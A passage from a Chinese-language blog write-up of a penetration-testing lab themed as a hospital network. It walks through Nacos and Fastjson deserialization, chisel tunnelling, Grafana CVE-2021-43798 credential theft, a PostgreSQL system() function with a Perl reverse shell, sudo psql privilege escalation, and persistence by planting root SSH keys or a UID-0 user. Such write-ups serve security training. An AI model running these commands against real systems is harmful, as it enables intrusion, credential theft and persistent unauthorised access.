<p>使用 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/charonlight/NacosExploitGUI">charonlight&#x2F;NacosExploitGUI</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 让 nacos 服务器去从远程服务器加载恶意的 <code>yaml-payload.jar</code> 包：</p>
<p><img src="/2025/03/13/Hospital/24.png"></p>
<p><img src="/2025/03/13/Hospital/16.png"></p>
<p>Rdp上去</p>
<p><img src="/2025/03/13/Hospital/17.png"></p>

        <h2 id="医院后台管理平台">
          <a href="#医院后台管理平台" class="heading-link"><i class="fas fa-link"></i></a><a href="#医院后台管理平台" class="headerlink" title="医院后台管理平台"></a>医院后台管理平台</h2>
      <p><img src="/2025/03/13/Hospital/25.png"></p>
<p>经过弱口令，后台爆破，漏洞扫描后无果；进行抓包检测</p>
<p><img src="/2025/03/13/Hospital/19.png"></p>
<p>发现此时数据以json进行传输</p>
<p><img src="/2025/03/13/Hospital/20.png"></p>
<p>且指纹识别工具识别出java环境；很容易想到fastjson</p>

        <h3 id="Fastjson-Deserialization">
          <a href="#Fastjson-Deserialization" class="heading-link"><i class="fas fa-link"></i></a><a href="#Fastjson-Deserialization" class="headerlink" title="Fastjson Deserialization"></a>Fastjson Deserialization</h3>
      <p>检测版本</p>
<p><img src="/2025/03/13/Hospital/18.png"></p>
<p>漏洞检测</p>
<p><img src="/2025/03/13/Hospital/21.png"></p>
<p>注入内存马</p>
<p><img src="/2025/03/13/Hospital/22.png"></p>

        <h3 id="受控机器（web2）信息收集">
          <a href="#受控机器（web2）信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#受控机器（web2）信息收集" class="headerlink" title="受控机器（web2）信息收集"></a>受控机器（web2）信息收集</h3>
      
        <h4 id="双网卡机器">
          <a href="#双网卡机器" class="heading-link"><i class="fas fa-link"></i></a><a href="#双网卡机器" class="headerlink" title="双网卡机器"></a>双网卡机器</h4>
      <p><img src="/2025/03/13/Hospital/26.png"></p>

        <h2 id="二级隧道搭建">
          <a href="#二级隧道搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#二级隧道搭建" class="headerlink" title="二级隧道搭建"></a>二级隧道搭建</h2>
      <p>因为上面的肉鸡（web2）是双网卡机器，那么此时我们就要利用到多级隧道的搭建技术。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VPS -&gt; 外网靶机 -&gt;内网机器2 -&gt; 内网机器3</span><br></pre></td></tr></table></div></figure>


        <h3 id="chisel多级隧道搭建">
          <a href="#chisel多级隧道搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#chisel多级隧道搭建" class="headerlink" title="chisel多级隧道搭建"></a>chisel多级隧道搭建</h3>
      
        <h4 id="外网靶机搭建服务端">
          <a href="#外网靶机搭建服务端" class="heading-link"><i class="fas fa-link"></i></a><a href="#外网靶机搭建服务端" class="headerlink" title="外网靶机搭建服务端"></a>外网靶机搭建服务端</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 7001 --reverse</span><br></pre></td></tr></table></div></figure>

<p><img src="/2025/03/13/Hospital/33.png"></p>

        <h4 id="双网卡机器上面搭建客户端">
          <a href="#双网卡机器上面搭建客户端" class="heading-link"><i class="fas fa-link"></i></a><a href="#双网卡机器上面搭建客户端" class="headerlink" title="双网卡机器上面搭建客户端"></a>双网卡机器上面搭建客户端</h4>
      <p>此时先将双网卡机器的shell反弹到入口机器上（有交互式终端）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 172.30.12.5:7002 R:0.0.0.0:7000:socks</span><br></pre></td></tr></table></div></figure>

<p><img src="/2025/03/13/Hospital/27.png"></p>

        <h4 id="本地Proxifer搭建代理链">
          <a href="#本地Proxifer搭建代理链" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地Proxifer搭建代理链" class="headerlink" title="本地Proxifer搭建代理链"></a>本地Proxifer搭建代理链</h4>
      <p><img src="/2025/03/13/Hospital/30.png"></p>

        <h4 id="proxychains-conf">
          <a href="#proxychains-conf" class="heading-link"><i class="fas fa-link"></i></a><a href="#proxychains-conf" class="headerlink" title="proxychains.conf"></a>proxychains.conf</h4>
      <p><img src="/2025/03/13/Hospital/34.png"></p>
<p>此时的整个多级代理如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">外网-&gt;47.xx.xx.xx:6666(My_VPS) -&gt; 172.30.12.5:7000 (外网靶机) -&gt; 172.30.54.12(双网卡机器)</span><br></pre></td></tr></table></div></figure>




        <h2 id="内网信息收集2">
          <a href="#内网信息收集2" class="heading-link"><i class="fas fa-link"></i></a><a href="#内网信息收集2" class="headerlink" title="内网信息收集2"></a>内网信息收集2</h2>
      <p><img src="/2025/03/13/Hospital/32.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.30.54.1/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-03-13 15:05:20] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-03-13 15:05:20] [INFO] 开始信息扫描</span><br><span class="line">[2025-03-13 15:05:20] [INFO] CIDR范围: 172.30.54.0-172.30.54.255</span><br><span class="line">[2025-03-13 15:05:20] [INFO] 生成IP范围: 172.30.54.0.%!d(string=172.30.54.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-03-13 15:05:20] [INFO] 解析CIDR 172.30.54.1/24 -&gt; IP范围 172.30.54.0-172.30.54.255</span><br><span class="line">[2025-03-13 15:05:20] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-03-13 15:05:20] [INFO] 开始主机扫描</span><br><span class="line">[2025-03-13 15:05:20] [SUCCESS] 目标 172.30.54.179   存活 (ICMP)</span><br><span class="line">[2025-03-13 15:05:20] [SUCCESS] 目标 172.30.54.12    存活 (ICMP)</span><br><span class="line">[2025-03-13 15:05:23] [INFO] 存活主机数量: 2</span><br><span class="line">[2025-03-13 15:05:23] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-03-13 15:05:23] [SUCCESS] 端口开放 172.30.54.179:22</span><br><span class="line">[2025-03-13 15:05:23] [SUCCESS] 端口开放 172.30.54.12:22</span><br><span class="line">[2025-03-13 15:05:23] [SUCCESS] 端口开放 172.30.54.12:5432</span><br><span class="line">[2025-03-13 15:05:23] [SUCCESS] 端口开放 172.30.54.12:3000</span><br><span class="line">[2025-03-13 15:05:23] [SUCCESS] 端口开放 172.30.54.179:8009</span><br><span class="line">[2025-03-13 15:05:23] [SUCCESS] 端口开放 172.30.54.179:8080</span><br><span class="line">[2025-03-13 15:05:23] [SUCCESS] 服务识别 172.30.54.179:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="line">[2025-03-13 15:05:23] [SUCCESS] 服务识别 172.30.54.12:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]</span><br><span class="line">[2025-03-13 15:05:28] [SUCCESS] 服务识别 172.30.54.12:5432 =&gt; </span><br><span class="line">[2025-03-13 15:05:28] [SUCCESS] 服务识别 172.30.54.12:3000 =&gt; [http] Banner:[HTTP/1.1 400 Bad Request.Content-Type: text/plain; charset=utf-8.Connection: close.400 Bad Request]</span><br><span class="line">[2025-03-13 15:05:29] [SUCCESS] 服务识别 172.30.54.179:8009 =&gt; </span><br><span class="line">[2025-03-13 15:05:29] [SUCCESS] 服务识别 172.30.54.179:8080 =&gt; [http]</span><br><span class="line">[2025-03-13 15:05:29] [INFO] 存活端口数量: 6</span><br><span class="line">[2025-03-13 15:05:29] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-03-13 15:05:29] [INFO] 加载的插件: postgres, ssh, webpoc, webtitle</span><br><span class="line">[2025-03-13 15:05:29] [SUCCESS] 网站标题 http://172.30.54.179:8080 状态码:200 长度:3964   标题:医院后台管理平台</span><br><span class="line">[2025-03-13 15:05:29] [SUCCESS] 网站标题 http://172.30.54.12:3000  状态码:302 长度:29     标题:无标题 重定向地址: http://172.30.54.12:3000/login</span><br><span class="line">[2025-03-13 15:05:29] [SUCCESS] 网站标题 http://172.30.54.12:3000/login 状态码:200 长度:27909  标题:Grafana</span><br></pre></td></tr></table></div></figure>


        <h3 id="Grafana-数据可视化平台">
          <a href="#Grafana-数据可视化平台" class="heading-link"><i class="fas fa-link"></i></a><a href="#Grafana-数据可视化平台" class="headerlink" title="Grafana 数据可视化平台"></a>Grafana 数据可视化平台</h3>
      <p><img src="/2025/03/13/Hospital/31.png"></p>

        <h4 id="Grafana-Unauthorized-Arbitrary-File-Reading-CVE-2021-43798">
          <a href="#Grafana-Unauthorized-Arbitrary-File-Reading-CVE-2021-43798" class="heading-link"><i class="fas fa-link"></i></a><a href="#Grafana-Unauthorized-Arbitrary-File-Reading-CVE-2021-43798" class="headerlink" title="Grafana Unauthorized Arbitrary File Reading (CVE-2021-43798)"></a>Grafana Unauthorized Arbitrary File Reading (CVE-2021-43798)</h4>
      <p>需要利用 CVE-2021-43798 漏洞获取到数据库文件（&#x2F;var&#x2F;lib&#x2F;grafana&#x2F;grafana.db）以及存在解密密钥的配置文件（&#x2F;etc&#x2F;grafana&#x2F;grafana.ini），然后进行解密。</p>
<p>使用 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/A-D-Team/grafanaExp">A-D-Team&#x2F;grafanaExp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 可以一键利用漏洞解密输出 data_souce 信息：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@web03:~# ./grafanaExp_linux_amd64 exp -u http://172.30.54.12:3000</span><br><span class="line">2023/12/29 17:41:34 Target vulnerable has plugin [alertlist]</span><br><span class="line">2023/12/29 17:41:34 Got secret_key [SW2YcwTIb9zpOOhoPsMm]</span><br><span class="line">2023/12/29 17:41:34 There is [0] records in db.</span><br><span class="line">2023/12/29 17:41:34 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123]database:[postgres]      basic_auth_user:[]      basic_auth_password:[]</span><br><span class="line">2023/12/29 17:41:34 All Done, have nice day!</span><br></pre></td></tr></table></div></figure>


        <h3 id="PostgreSQL">
          <a href="#PostgreSQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q psql -h 172.30.54.12 -U postgres -W</span><br><span class="line">Postgres@123</span><br></pre></td></tr></table></div></figure>

<p><img src="/2025/03/13/Hospital/35.png"></p>

        <h4 id="PostgreSQL渗透">
          <a href="#PostgreSQL渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#PostgreSQL渗透" class="headerlink" title="PostgreSQL渗透"></a>PostgreSQL渗透</h4>
      <p>参考文章：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://tttang.com/archive/1547/#toc_0x06-postgresql">https://tttang.com/archive/1547/#toc_0x06-postgresql</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="/2025/03/13/Hospital/36.png"></p>

        <h5 id="psql创建函数执行命令">
          <a href="#psql创建函数执行命令" class="heading-link"><i class="fas fa-link"></i></a><a href="#psql创建函数执行命令" class="headerlink" title="psql创建函数执行命令"></a>psql创建函数执行命令</h5>
      <figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">FUNCTION</span> <span class="keyword">system</span> (cstring) <span class="keyword">RETURNS</span> <span class="type">integer</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">LANGUAGE</span> <span class="string">&#x27;c&#x27;</span> STRICT;</span><br></pre></td></tr></table></div></figure>


        <h5 id="反弹shell">
          <a href="#反弹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5>
      <figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">&#x27;perl -e \&#x27;</span>use Socket;$i<span class="operator">=</span>&quot;172.30.54.179&quot;;$p<span class="operator">=</span><span class="number">4443</span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="keyword">open</span>(STDIN,&quot;&gt;&amp;S&quot;);<span class="keyword">open</span>(STDOUT,&quot;&gt;&amp;S&quot;);<span class="keyword">open</span>(STDERR,&quot;&gt;&amp;S&quot;);<span class="keyword">exec</span>(&quot;/bin/sh -i&quot;);&#125;;\<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="/2025/03/13/Hospital/37.png"></p>
<p>进入交互式终端：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></div></figure>


        <h5 id="PostgreSQL提权">
          <a href="#PostgreSQL提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#PostgreSQL提权" class="headerlink" title="PostgreSQL提权"></a>PostgreSQL提权</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/local/postgresql/bin/psql</span><br><span class="line">\?</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></div></figure>

<p><img src="/2025/03/13/Hospital/38.png"></p>

        <h1 id="tips">
          <a href="#tips" class="heading-link"><i class="fas fa-link"></i></a><a href="#tips" class="headerlink" title="tips"></a>tips</h1>
      <p><img src="/2025/03/13/Hospital/39.png"></p>
<p>这个靶场跟以往的不同，没有涉及到域的渗透；而是多了一个双网卡机器下的多层代理；也符合现在攻防演习下各个靶标的现实情况，都说现在的域是可遇不可求的情况。整体难度来说不难，最后在PostgersSql卡了好久，没有遇到这种数据库渗透的现实情况。针对于多网卡机器，如果是Windows下，我们最好直接Rdp上去，这样对后续的shell的交互也会较为方便；而本次基本都是Linux机器，在我的打法下基本是将双网卡机器的shell反弹至入口点的外网靶机；这样子有个坏处就是shell的交互没有那么的方便并且感觉很笨重，在后续的复盘中我想我们可以直接通过改机器密码的操作或者添加root用户又或者是写公钥获得root权限的方式来接管肉鸡，直接使用ssh接管双网卡机器，这样子也对我们后渗透中的shell交互有一定的便捷性。</p>
<p><strong>写公钥</strong></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#自己的机器上</span><br><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">#弹的shell</span><br><span class="line">echo &quot;~/.ssh/id_rsa.pub的内容&quot; &gt; /root/.ssh/authorized_keyschmod 600 /root/.ssh/authorized_keys</span><br><span class="line">chmod 600 /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">ssh -i ~/.ssh/id_rsa root@39.99.140.174</span><br></pre></td></tr></table></div></figure>

<p><strong>添加root用户</strong></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt test 1234    //生成密码</span><br><span class="line">$1$test$So8QlDklBBy90T3QcEYWU/      //得到</span><br><span class="line">test:$1$test$So8QlDklBBy90T3QcEYWU/:0:0:/root:/bin/bash      //构造好</span><br><span class="line"></span><br><span class="line">写进/etc/passwd</span><br><span class="line">wq!强制保存后</span><br><span class="line">su test切换用户</span><br></pre></td></tr></table></div></figure>

<p><strong>改密码</strong></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd root</span><br><span class="line">proxychains4 ssh root@172.30.12.236</span><br></pre></td></tr></table></div></figure>

</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ FIN ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Autor: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Enlace: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2025/03/13/Hospital/">https://hyggevv.github.io/2025/03/13/Hospital/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">Todos los artículos de este blog están bajo licencia  de <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> a menos que se indique lo contrario</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2025/03/22/%E6%80%BB%E7%BB%93/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Web and Forensics Guide</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2025/03/12/Spoofing/"><span class="paginator-prev__text">Spoofing Writeup</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Contenido</span><span class="sidebar-nav-ov">Reseña</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">
          外网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%BB%E7%96%97%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0"><span class="toc-number">1.1.</span> <span class="toc-text">
          医疗管理后台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-Boot-Heapdump"><span class="toc-number">1.1.1.</span> <span class="toc-text">
          Spring Boot Heapdump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro-Deserialization"><span class="toc-number">1.1.2.</span> <span class="toc-text">
          Shiro Deserialization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">1.1.3.</span> <span class="toc-text">
          getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Vim-basic-%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">
          Vim.basic 提权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">
          内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">
          内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nacos"><span class="toc-number">2.2.</span> <span class="toc-text">
          Nacos</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nacos-Client-Yaml-Deserialization"><span class="toc-number">2.2.1.</span> <span class="toc-text">
          Nacos Client Yaml Deserialization</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%BB%E9%99%A2%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0"><span class="toc-number">2.3.</span> <span class="toc-text">
          医院后台管理平台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson-Deserialization"><span class="toc-number">2.3.1.</span> <span class="toc-text">
          Fastjson Deserialization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E6%8E%A7%E6%9C%BA%E5%99%A8%EF%BC%88web2%EF%BC%89%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.3.2.</span> <span class="toc-text">
          受控机器（web2）信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8C%E7%BD%91%E5%8D%A1%E6%9C%BA%E5%99%A8"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">
          双网卡机器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BA%A7%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">2.4.</span> <span class="toc-text">
          二级隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#chisel%E5%A4%9A%E7%BA%A7%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">2.4.1.</span> <span class="toc-text">
          chisel多级隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E9%9D%B6%E6%9C%BA%E6%90%AD%E5%BB%BA%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">
          外网靶机搭建服务端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8C%E7%BD%91%E5%8D%A1%E6%9C%BA%E5%99%A8%E4%B8%8A%E9%9D%A2%E6%90%AD%E5%BB%BA%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">
          双网卡机器上面搭建客户端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0Proxifer%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86%E9%93%BE"><span class="toc-number">2.4.1.3.</span> <span class="toc-text">
          本地Proxifer搭建代理链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proxychains-conf"><span class="toc-number">2.4.1.4.</span> <span class="toc-text">
          proxychains.conf</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%862"><span class="toc-number">2.5.</span> <span class="toc-text">
          内网信息收集2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Grafana-%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E5%B9%B3%E5%8F%B0"><span class="toc-number">2.5.1.</span> <span class="toc-text">
          Grafana 数据可视化平台</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Grafana-Unauthorized-Arbitrary-File-Reading-CVE-2021-43798"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">
          Grafana Unauthorized Arbitrary File Reading (CVE-2021-43798)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL"><span class="toc-number">2.5.2.</span> <span class="toc-text">
          PostgreSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PostgreSQL%E6%B8%97%E9%80%8F"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">
          PostgreSQL渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#psql%E5%88%9B%E5%BB%BA%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.5.2.1.1.</span> <span class="toc-text">
          psql创建函数执行命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.5.2.1.2.</span> <span class="toc-text">
          反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PostgreSQL%E6%8F%90%E6%9D%83"><span class="toc-number">2.5.2.1.3.</span> <span class="toc-text">
          PostgreSQL提权</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tips"><span class="toc-number">3.</span> <span class="toc-text">
          tips</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">120</div><div class="sidebar-ov-state-item__name">Archivo</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categorías</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Etiquetas</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">Has leído </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2025</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Potenciado por <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Tema - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Vistas</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script 